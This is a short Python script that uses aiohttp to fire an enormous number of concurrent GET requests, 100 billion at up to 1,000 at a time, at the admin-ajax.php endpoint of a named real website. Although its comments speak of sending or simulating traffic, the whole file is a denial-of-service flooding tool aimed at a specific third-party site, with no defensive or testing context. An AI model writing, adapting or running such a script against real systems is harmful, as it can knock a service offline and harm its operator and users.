import aiohttp
import asyncio

# URL of the website you want to send traffic to
url = 'https://iptv-nederland.com/wp-admin/admin-ajax.php'

# Number of requests you want to send
number_of_requests = 100000000000

# Number of concurrent tasks (you can adjust this based on your system's capacity)
concurrency_limit = 1000

# Semaphore to control the number of concurrent tasks
semaphore = asyncio.Semaphore(concurrency_limit)

async def send_request(session, request_number):
    async with semaphore:
        try:
            async with session.get(url) as response:
                print(f"Request {request_number}: Status code {response.status}")
        except Exception as e:
            print(f"Request {request_number}: Failed with exception {e}")

async def simulate_traffic():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, i + 1) for i in range(number_of_requests)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(simulate_traffic())
